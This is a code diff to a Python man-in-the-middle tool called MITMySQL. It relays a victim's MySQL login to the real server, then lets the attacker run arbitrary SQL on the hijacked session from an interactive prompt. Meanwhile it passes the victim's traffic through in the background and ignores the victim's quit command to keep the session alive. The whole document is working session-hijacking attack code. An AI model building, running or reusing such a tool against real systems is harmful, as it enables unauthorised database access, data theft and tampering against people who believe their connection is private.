@@ -1,8 +1,10 @@
 # -*- coding: utf-8 -*-
 
-from pymysql_wrapper import ConnectionWrapper
+from pymysql_wrapper import ConnectionWrapper, MysqlPacket, OKPacketWrapper, EOFPacketWrapper
 from pymysql.connections import _makefile
+from pymysql.constants import COMMAND
 
+import concurrent.futures
 import socket
 import logging
 import argparse
@@ -31,13 +33,66 @@ def authenticate(client, server):
         client_payload = client.recv(4096)
         logger.debug("[*] REQUEST: {}".format(client_payload))
         server.write_packet(client_payload[4:])
-
-        # ok response is the sign for the time when the authentication is succeeded.
-        if server._read_packet().is_ok_packet():
-            logger.debug("[*] AUTHENTICATION PROCESS.")
-            break
+        authentication_result_raw = server._read_packet_raw()
+        client.send(authentication_result_raw)
         
+        # ok response is the sign for the time when the authentication is succeeded.
+        if MysqlPacket(authentication_result_raw[4:], server.encoding).is_ok_packet():
+            break        
+        logger.debug("[*] AUTHENTICATION PROCESS CONTINUES.")
+
     logger.info("[+] AUTHENTICATION SUCCEEDED")
+    
+def interpreter_parent(server_connection, worker):
+    with server_connection.cursor() as cursor:
+        while True:
+            try:
+                sql_query = input("> ")
+                p = worker.submit(interpreter_child, server_connection, cursor, sql_query)
+                print(p.result())
+            except Exception as e:
+                logger.debug("[-] Error occured: {}".format(e))
+
+def interpreter_child(server, cursor, query):
+    try:
+        cursor.execute(query)
+        return cursor.fetchall()
+    except Exception as e:
+        logger.debug("[-] INTERPRETER ERROR: {}".format(e))
+        return e
+
+def passthrough_parent(client, server, worker):
+    try:
+        while True:
+            logger.debug("[*] WAITING CLIENT ON BACKGROUND...")
+            payload = client.recv(4096)
+            worker.submit(passthrough_child, client, server, payload).result()
+    except Exception as e:
+        logger.debug("[-] CLIENT ERROR: {} ".format(e))
+            
+def passthrough_child(client, server, payload):
+    try:
+        logger.debug("[*] SEND TO SERVER FROM CLIENT: {}".format(payload))
+        server._next_seq_id = 0
+        if payload[4] == COMMAND.COM_QUIT:
+            logger.info("[+] CLIENT REQUESTED QUITTING, BUT IGNORE IT :-)")
+            return
+        server.write_packet(payload[4:])
+        for _ in range(1 if payload[4] != COMMAND.COM_QUERY else 2):
+            while True:
+                packet_raw = server._read_packet_raw()
+                packet = MysqlPacket(packet_raw[4:], server.encoding)            
+                logger.debug("[*] SEND TO CLIENT FROM SERVER: {}".format(packet_raw))
+                client.send(packet_raw)            
+                if packet.is_eof_packet() and not EOFPacketWrapper(packet).has_next:
+                    break
+                if packet.is_ok_packet() and not OKPacketWrapper(packet).has_next:
+                    break
+        server._next_seq_id = 0        
+        logger.debug("[*] PASSTHROUGH SUCCEEDED")
+    except Exception as e:
+        logger.debug("[-] PASSTHROUGH ERROR: {}".format(e))
+    return
     
 def main(local_addr, server_addr):
     logger.debug("[*] MITMySQL INFORMATION: {}, {}".format(local_addr, server_addr))
@@ -62,20 +117,16 @@ def main(local_addr, server_addr):
     # wait that the victim finish his authentication
     authenticate(client_connection, server_connection)
 
-    # you can do everything here with cursor
-    with server_connection.cursor() as cursor:
-        while True:
-            try:
-                sql_query = input("> ")
-                cursor.execute(sql_query)
-                print(cursor.fetchall())
-            except Exception as e:
-                print("Error occured: {}".format(e))
+    sql_worker = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as e:
+        e.submit(passthrough_parent, client_connection, server_connection, sql_worker)
+        e.submit(interpreter_parent, server_connection, sql_worker)
                 
     # finalize
     conn.close()
     local_sock.close()
-    remote_sock.cklose()
+    remote_sock.close()
+    sql_worker.shutdown()
     
 if __name__ == "__main__":
 
